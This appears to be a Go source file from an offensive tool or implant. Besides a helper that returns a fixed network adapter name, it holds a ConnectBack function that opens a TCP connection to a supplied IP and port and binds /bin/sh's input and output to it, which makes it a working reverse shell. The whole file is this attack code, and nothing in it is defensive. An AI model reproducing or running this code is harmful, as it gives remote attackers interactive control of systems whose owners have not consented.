package spec

import (
	"net"
	"os/exec"
)

func GetAdapter() string {
	return "ens160"
}

func ConnectBack(ip string, connectbackPort string) {
	addr := net.JoinHostPort(ip, connectbackPort)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		// TODO: figure out error handling
		return
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	cmd.Run()
	conn.Close()
}
